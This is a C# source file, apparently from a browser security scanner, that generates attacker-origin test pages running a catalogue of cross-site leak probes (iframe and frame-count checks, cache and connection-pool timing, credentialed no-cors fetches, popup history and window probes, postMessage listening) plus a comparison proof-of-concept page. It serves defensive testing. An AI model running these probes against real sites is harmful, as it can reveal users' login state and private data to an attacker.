using System.Text.Json;

namespace Trowser.Security.XsLeaks;

/// <summary>Builds the mocked attacker-origin page that measures cross-site observables.</summary>
internal static class AttackerPageBuilder
{
    public const string AttackerOrigin = "https://evil.trowser.test";

    public static string ResolveAttackerOrigin(string? attackerSite, string victimUrl)
    {
        if (!string.Equals(attackerSite, "same-site", StringComparison.OrdinalIgnoreCase))
            return AttackerOrigin;
        if (Uri.TryCreate(victimUrl, UriKind.Absolute, out var victim))
            return $"https://evil-samesite.{victim.Host}";
        return AttackerOrigin;
    }

    public static string PageUrl(string runId, string? attackerOrigin = null)
    {
        var origin = string.IsNullOrWhiteSpace(attackerOrigin) ? AttackerOrigin : attackerOrigin.TrimEnd('/');
        return $"{origin}/xsleak/{runId}";
    }

    public static string BuildHtml(XsLeakScanner.StateSpec state, string technique, int trialIndex)
    {
        if (string.Equals(technique, "form-post-frame", StringComparison.OrdinalIgnoreCase))
            return BuildFormPostFrameHtml(state, trialIndex);
        return BuildHtml(state.Url, technique, trialIndex);
    }

    private static string BuildFormPostFrameHtml(XsLeakScanner.StateSpec state, int trialIndex)
    {
        var action = state.Url.Split('?', '#')[0];
        var fields = state.Form ?? new Dictionary<string, string>();
        var actionJson = JsonSerializer.Serialize(action);
        var fieldsJson = JsonSerializer.Serialize(fields);
        return $$"""
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>XS-Leak form POST</title></head>
<body>
<script>
(async function(){
  var result = { technique: 'form-post-frame', trial: {{trialIndex}}, ok: false, value: null, ms: 0 };
  var t0 = performance.now();
  function done() {
    result.ms = performance.now() - t0;
    document.title = 'XSLEAK:' + JSON.stringify(result);
  }
  try {
    var iframe = document.createElement('iframe');
    iframe.name = 'xsleak_post_{{trialIndex}}';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = {{actionJson}};
    f.target = iframe.name;
    var fields = {{fieldsJson}};
    Object.keys(fields).forEach(function(k){
      var input = document.createElement('input');
      input.type = 'hidden';
      input.name = k;
      input.value = fields[k];
      f.appendChild(input);
    });
    document.body.appendChild(f);
    iframe.onload = function(){ result.value = 'load'; result.ok = true; done(); };
    iframe.onerror = function(){ result.value = 'error'; result.ok = true; done(); };
    setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; done(); } }, 6000);
    f.submit();
  } catch(e) {
    result.value = 'error:' + (e && e.message || e);
    done();
  }
})();
</script>
</body></html>
""";
    }

    public static string BuildHtml(string victimUrl, string technique, int trialIndex)
    {
        var victimJson = JsonSerializer.Serialize(victimUrl);
        var techJson = JsonSerializer.Serialize(technique);
        return $$"""
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>XS-Leak probe</title></head>
<body>
<script>
(async function(){
  var victim = {{victimJson}};
  var technique = {{techJson}};
  var trial = {{trialIndex}};
  var result = { technique: technique, trial: trial, victim: victim, ok: false, value: null, ms: 0, error: null };
  var t0 = performance.now();
  function done() {
    result.ms = performance.now() - t0;
    try { chrome.webview.postMessage({ type: '__trowser_xsleak', result: result }); } catch(e) {}
    document.title = 'XSLEAK:' + JSON.stringify(result);
  }
  try {
    if (technique === 'iframe-load') {
      await new Promise(function(res) {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        var settled = false;
        function finish(v) { if (settled) return; settled = true; result.value = v; result.ok = true; res(); }
        iframe.onload = function() { finish('load'); };
        iframe.onerror = function() { finish('error'); };
        setTimeout(function(){ finish('timeout'); }, 4000);
        iframe.src = victim;
        document.body.appendChild(iframe);
      });
    } else if (technique === 'iframe-framecount') {
      await new Promise(function(res) {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.onload = function() {
          var samples = [];
          var i = 0;
          function tick() {
            try {
              var w = iframe.contentWindow;
              samples.push(w.length);
            } catch(e) {
              samples.push(-1);
            }
            i++;
            if (i >= 8) {
              var nums = samples.filter(function(n) { return n >= 0; });
              result.value = nums.length ? String(Math.max.apply(null, nums)) : 'cross-origin';
              result.ok = true;
              res();
            } else setTimeout(tick, 75);
          }
          setTimeout(tick, 50);
        };
        iframe.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        iframe.src = victim;
        document.body.appendChild(iframe);
      });
    } else if (technique === 'script-error') {
      await new Promise(function(res) {
        var s = document.createElement('script');
        s.onload = function() { result.value = 'load'; result.ok = true; res(); };
        s.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        s.src = victim;
        document.body.appendChild(s);
      });
    } else if (technique === 'img-error') {
      await new Promise(function(res) {
        var img = new Image();
        img.onload = function() { result.value = 'load:' + img.naturalWidth + 'x' + img.naturalHeight; result.ok = true; res(); };
        img.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        img.src = victim;
      });
    } else if (technique === 'link-stylesheet-error') {
      await new Promise(function(res) {
        var link = document.createElement('link');
        link.rel = 'stylesheet';
        link.onload = function() { result.value = 'load'; result.ok = true; res(); };
        link.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        link.href = victim;
        document.head.appendChild(link);
      });
    } else if (technique === 'object-load') {
      await new Promise(function(res) {
        var o = document.createElement('object');
        o.style.display = 'none';
        o.onload = function() { result.value = 'load'; result.ok = true; res(); };
        o.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        o.data = victim;
        document.body.appendChild(o);
      });
    } else if (technique === 'popup-closed') {
      var w = window.open(victim, 'xsleak_' + trial, 'width=100,height=100');
      await new Promise(function(r){ setTimeout(r, 800); });
      try {
        result.value = (!w || w.closed) ? 'closed' : 'open';
        result.ok = true;
        if (w && !w.closed) try { w.close(); } catch(e) {}
      } catch(e) {
        result.value = 'blocked';
        result.ok = true;
      }
    } else if (technique === 'media-dimensions') {
      await new Promise(function(res) {
        var v = document.createElement('video');
        v.preload = 'metadata';
        v.onloadedmetadata = function() {
          result.value = (v.videoWidth||0) + 'x' + (v.videoHeight||0) + ':' + (v.duration||0);
          result.ok = true; res();
        };
        v.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        v.src = victim;
      });
    } else if (technique === 'performance-timing') {
      await new Promise(function(res) {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.onload = function() {
          try {
            var entries = performance.getEntriesByName(victim);
            var last = entries.length ? entries[entries.length-1] : null;
            result.value = last ? String(Math.round(last.duration||last.responseEnd||0)) : 'none';
          } catch(e) { result.value = 'error'; }
          result.ok = true; res();
        };
        iframe.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        iframe.src = victim;
        document.body.appendChild(iframe);
      });
    } else if (technique === 'fetch-redirect-type') {
      await new Promise(function(res) {
        fetch(victim, { redirect: 'manual', mode: 'no-cors', credentials: 'include' })
          .then(function(r) { result.value = r.type; result.ok = true; res(); })
          .catch(function() { result.value = 'error'; result.ok = true; res(); });
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
      });
    } else if (technique === 'resource-transfer-size') {
      await new Promise(function(res) {
        var img = new Image();
        function finish() {
          try {
            var entries = performance.getEntriesByType('resource').filter(function(e) {
              return e.name === victim || String(e.name).indexOf(victim.split('?')[0]) === 0;
            });
            var e = entries.length ? entries[entries.length - 1] : null;
            result.value = e ? (String(e.transferSize||0) + ':' + String(e.decodedBodySize||0)) : 'none';
          } catch(err) { result.value = 'error'; }
          result.ok = true; res();
        }
        img.onload = function() { setTimeout(finish, 30); };
        img.onerror = function() { setTimeout(finish, 30); };
        setTimeout(function(){ if (!result.ok) finish(); }, 4000);
        img.src = victim;
      });
    } else if (technique === 'audio-error') {
      await new Promise(function(res) {
        var a = document.createElement('audio');
        a.preload = 'metadata';
        a.onloadedmetadata = function() { result.value = 'load:' + (a.duration||0); result.ok = true; res(); };
        a.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        a.src = victim;
      });
    } else if (technique === 'broadcast-channel-probe') {
      await new Promise(function(res) {
        var heard = false;
        var channels = ['__trowser_xsleak', 'auth', 'session', 'cache', 'login'];
        var opened = [];
        function onMsg() { heard = true; }
        for (var i = 0; i < channels.length; i++) {
          try {
            var c = new BroadcastChannel(channels[i]);
            c.onmessage = onMsg;
            opened.push(c);
          } catch(e) {}
        }
        setTimeout(function() {
          for (var j = 0; j < opened.length; j++) try { opened[j].close(); } catch(e) {}
          result.value = heard ? 'heard' : 'none';
          result.ok = true;
          res();
        }, 650);
      });
    } else if (technique === 'cache-prime-probe') {
      await new Promise(function(res) {
        function readSize() {
          try {
            var entries = performance.getEntriesByType('resource').filter(function(e) {
              return e.name === victim || String(e.name).indexOf(victim.split('?')[0]) === 0;
            });
            var e = entries.length ? entries[entries.length - 1] : null;
            return e ? (String(e.transferSize||0) + ':' + String(e.decodedBodySize||0)) : 'none';
          } catch(err) { return 'error'; }
        }
        var img1 = new Image();
        img1.onload = img1.onerror = function() {
          setTimeout(function() {
            var img2 = new Image();
            img2.onload = img2.onerror = function() {
              setTimeout(function() {
                result.value = 'prime:' + readSize();
                result.ok = true;
                res();
              }, 40);
            };
            img2.src = victim + (victim.indexOf('?') >= 0 ? '&' : '?') + '__xsleak_prime=' + trial;
          }, 60);
        };
        img1.src = victim;
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 8000);
      });
    } else if (technique === 'connection-pool-exhaustion') {
      await new Promise(function(res) {
        var pending = 6;
        var tProbe = performance.now();
        function slotDone() {
          pending--;
          if (pending > 0) return;
          var img = new Image();
          img.onload = img.onerror = function() {
            result.value = String(Math.round(performance.now() - tProbe));
            result.ok = true;
            res();
          };
          img.src = victim + (victim.indexOf('?') >= 0 ? '&' : '?') + '__xsleak_pool=' + trial;
          setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 6000);
        }
        for (var i = 0; i < 6; i++) {
          fetch(victim, { mode: 'no-cors', credentials: 'include', cache: 'no-store' })
            .then(slotDone, slotDone);
        }
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 9000);
      });
    } else if (technique === 'status-bucket-oracle') {
      await new Promise(function(res) {
        var imgVal = 'pending';
        var fetchVal = 'pending';
        function finish() {
          if (imgVal === 'pending' || fetchVal === 'pending') return;
          result.value = 'fetch:' + fetchVal + '|img:' + imgVal;
          result.ok = true;
          res();
        }
        fetch(victim, { redirect: 'manual', mode: 'no-cors', credentials: 'include' })
          .then(function(r) { fetchVal = r.type; finish(); })
          .catch(function() { fetchVal = 'error'; finish(); });
        var img = new Image();
        img.onload = function() { imgVal = 'load'; finish(); };
        img.onerror = function() { imgVal = 'error'; finish(); };
        img.src = victim;
        setTimeout(function(){ if (!result.ok) { fetchVal = fetchVal === 'pending' ? 'timeout' : fetchVal; imgVal = imgVal === 'pending' ? 'timeout' : imgVal; finish(); } }, 5000);
      });
    } else if (technique === 'script-module-error') {
      await new Promise(function(res) {
        var s = document.createElement('script');
        s.type = 'module';
        s.onload = function() { result.value = 'load'; result.ok = true; res(); };
        s.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        s.src = victim;
        document.body.appendChild(s);
      });
    } else if (technique === 'track-error') {
      await new Promise(function(res) {
        var t = document.createElement('track');
        t.onload = function() { result.value = 'load'; result.ok = true; res(); };
        t.onerror = function() { result.value = 'error'; result.ok = true; res(); };
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
        var v = document.createElement('video');
        v.style.display = 'none';
        t.src = victim;
        v.appendChild(t);
        document.body.appendChild(v);
      });
    } else if (technique === 'csp-violation-probe') {
      await new Promise(function(res) {
        var violations = 0;
        var blocked = '';
        document.addEventListener('securitypolicyviolation', function(ev) {
          violations++;
          if (ev.blockedURI) blocked = String(ev.blockedURI).substring(0, 120);
        });
        var meta = document.createElement('meta');
        meta.httpEquiv = 'Content-Security-Policy';
        try {
          var vo = new URL(victim).origin;
          meta.content = "img-src 'self' " + vo;
        } catch(e) {
          meta.content = "img-src 'self'";
        }
        document.head.appendChild(meta);
        var img = new Image();
        img.src = victim;
        setTimeout(function() {
          result.value = violations > 0 ? ('csp-violation:' + blocked) : 'csp-clean';
          result.ok = true;
          res();
        }, 900);
      });
    } else if (technique === 'redirect-count-oracle') {
      await new Promise(function(res) {
        fetch(victim, { redirect: 'follow', mode: 'no-cors', credentials: 'include' })
          .then(function() {
            try {
              var entries = performance.getEntriesByType('resource').filter(function(e) {
                return e.name === victim || String(e.name).indexOf(victim.split('?')[0]) === 0;
              });
              var e = entries.length ? entries[entries.length - 1] : null;
              var redirects = e && typeof e.redirectCount === 'number' ? e.redirectCount : -1;
              result.value = 'redirects:' + redirects;
            } catch(err) { result.value = 'error'; }
            result.ok = true;
            res();
          })
          .catch(function() { result.value = 'fetch-error'; result.ok = true; res(); });
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 5000);
      });
    } else if (technique === 'window-open-length') {
      await new Promise(function(res) {
        var w = window.open(victim, 'xsleak_len_' + trial, 'width=120,height=120');
        var samples = [];
        var i = 0;
        function tick() {
          i++;
          try {
            samples.push(w ? String(w.length) : 'null');
          } catch(e) {
            samples.push('blocked');
          }
          if (i >= 4) {
            if (w && !w.closed) try { w.close(); } catch(e2) {}
            result.value = samples.join(',');
            result.ok = true;
            res();
          } else setTimeout(tick, 200);
        }
        setTimeout(tick, 300);
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 5000);
      });
    } else if (technique === 'history-length-delta') {
      await new Promise(function(res) {
        var attackerBefore = history.length;
        var w = window.open(victim, 'xsleak_hist_' + trial, 'width=120,height=120');
        setTimeout(function() {
          var attackerAfter = history.length;
          var popupHist = 'blocked';
          try { popupHist = w ? String(w.history.length) : 'null'; } catch(e) { popupHist = 'blocked'; }
          if (w && !w.closed) try { w.close(); } catch(e2) {}
          result.value = 'attacker:' + attackerBefore + '->' + attackerAfter + '|popup:' + popupHist;
          result.ok = true;
          res();
        }, 900);
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 5000);
      });
    } else if (technique === 'named-window-reuse') {
      await new Promise(function(res) {
        var name = 'xsleak_reuse_fixed';
        var w1 = window.open(victim, name, 'width=100,height=100');
        setTimeout(function() {
          var w2 = window.open(victim + (victim.indexOf('?') >= 0 ? '&' : '?') + '__xsleak=' + trial, name);
          setTimeout(function() {
            result.value = (w1 && w2 && w1 === w2) ? 'same-window' : 'different-window';
            result.ok = true;
            try { if (w2 && !w2.closed) w2.close(); } catch(e) {}
            res();
          }, 450);
        }, 450);
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 5000);
      });
    } else if (technique === 'event-loop-blocking') {
      await new Promise(function(res) {
        var deadline = performance.now() + 60;
        while (performance.now() < deadline) {}
        var t0 = performance.now();
        var img = new Image();
        img.onload = img.onerror = function() {
          result.value = String(Math.round(performance.now() - t0));
          result.ok = true;
          res();
        };
        img.src = victim;
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 6000);
      });
    } else if (technique === 'cache-timing') {
      await new Promise(function(res) {
        var img1 = new Image();
        img1.onload = img1.onerror = function() {
          setTimeout(function() {
            var t0 = performance.now();
            var img2 = new Image();
            img2.onload = img2.onerror = function() {
              result.value = String(Math.round(performance.now() - t0));
              result.ok = true;
              res();
            };
            img2.src = victim + (victim.indexOf('?') >= 0 ? '&' : '?') + '__xsleak_cache=' + trial;
          }, 80);
        };
        img1.src = victim;
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 8000);
      });
    } else if (technique === 'postmessage-listen') {
      await new Promise(function(res) {
        var got = null;
        function onMsg(ev) {
          if (String(ev.origin||'') === new URL(victim).origin) {
            got = typeof ev.data === 'string' ? ev.data.substring(0,80) : 'object';
          }
        }
        window.addEventListener('message', onMsg);
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.onload = function() {
          setTimeout(function(){
            window.removeEventListener('message', onMsg);
            result.value = got ? ('msg:' + got) : 'none';
            result.ok = true; res();
          }, 600);
        };
        iframe.src = victim;
        document.body.appendChild(iframe);
        setTimeout(function(){ if (!result.ok) { result.value = 'timeout'; result.ok = true; res(); } }, 4000);
      });
    } else {
      result.error = 'unknown-technique';
    }
  } catch(e) {
    result.error = String(e && e.message || e);
  }
  done();
})();
</script>
</body></html>
""";
    }

    /// <summary>PoC page that runs the same technique against every victim state and logs observables side-by-side.</summary>
    public static string BuildComparisonHtml(IReadOnlyList<XsLeakScanner.StateSpec> states, string technique)
    {
        if (states.Count == 0)
            return BuildHtml("", technique, 0);
        if (states.Count == 1)
            return BuildHtml(states[0].Url, technique, 0);

        var probeHtml = BuildHtml(states[0].Url, technique, 0);
        var scriptStart = probeHtml.IndexOf("<script>", StringComparison.Ordinal) + 8;
        var scriptEnd = probeHtml.LastIndexOf("</script>", StringComparison.Ordinal);
        var probeBody = probeHtml[scriptStart..scriptEnd];
        probeBody = probeBody.Replace("(async function(){", "async function xsleakProbe(victimUrl, trialIndex){", StringComparison.Ordinal);
        probeBody = probeBody.Replace(
            $"var victim = {JsonSerializer.Serialize(states[0].Url)};",
            "var victim = victimUrl;",
            StringComparison.Ordinal);
        probeBody = probeBody.Replace("var trial = 0;", "var trial = trialIndex;", StringComparison.Ordinal);
        probeBody = probeBody.Replace(
            "document.title = 'XSLEAK:' + JSON.stringify(result);",
            "return result;",
            StringComparison.Ordinal);
        probeBody = probeBody.Replace("  done();\n})();", "  return done();\n}", StringComparison.Ordinal);

        var statesJson = JsonSerializer.Serialize(states.Select(s => new { label = s.Label, url = s.Url }));
        var techJson = JsonSerializer.Serialize(technique);
        var listItems = string.Join("\n",
            states.Select(s =>
                $"<li><strong>{System.Net.WebUtility.HtmlEncode(s.Label)}</strong> — {System.Net.WebUtility.HtmlEncode(s.Url)}</li>"));

        return $$"""
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>XS-Leak comparison PoC</title></head>
<body>
<h1>XS-Leak state comparison</h1>
<ol>
{{listItems}}
</ol>
<p>Technique: <code>{{System.Net.WebUtility.HtmlEncode(technique)}}</code></p>
<pre id="comparison-log">Probing…</pre>
<script>
{{probeBody}}
(async function(){
  var states = {{statesJson}};
  var technique = {{techJson}};
  var lines = [];
  for (var i = 0; i < states.length; i++) {
    var r = await xsleakProbe(states[i].url, i);
    lines.push(states[i].label + ' (' + states[i].url + '): ' + (r.value ?? r.error ?? 'null'));
  }
  document.getElementById('comparison-log').textContent = lines.join('\n');
  document.title = 'XSLEAK:' + JSON.stringify({ technique: technique, comparison: lines });
})();
</script>
</body></html>
""";
    }

    /// <summary>Minimal attacker page for COOP opener isolation probe (posture, not a catalog technique).</summary>
    public static string BuildCoopOpenerProbeHtml(string victimUrl)
    {
        var victimJson = JsonSerializer.Serialize(victimUrl);
        return $$"""
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>COOP probe</title></head>
<body>
<script>
(async function(){
  var victim = {{victimJson}};
  var result = { ok: false, value: 'timeout' };
  try {
    var w = window.open(victim, 'coop_probe', 'width=120,height=120');
    await new Promise(function(r){ setTimeout(r, 900); });
    if (!w || w.closed) result.value = 'popup-blocked';
    else {
      try {
        var severed = (w.opener === null);
        result.value = severed ? 'coop-severed' : 'opener-visible';
      } catch(e) {
        result.value = 'opener-blocked';
      }
      try { w.close(); } catch(e2) {}
    }
    result.ok = true;
  } catch(e) {
    result.value = 'error:' + (e && e.message || e);
    result.ok = true;
  }
  document.title = 'XSLEAK:' + JSON.stringify(result);
})();
</script>
</body></html>
""";
    }
}
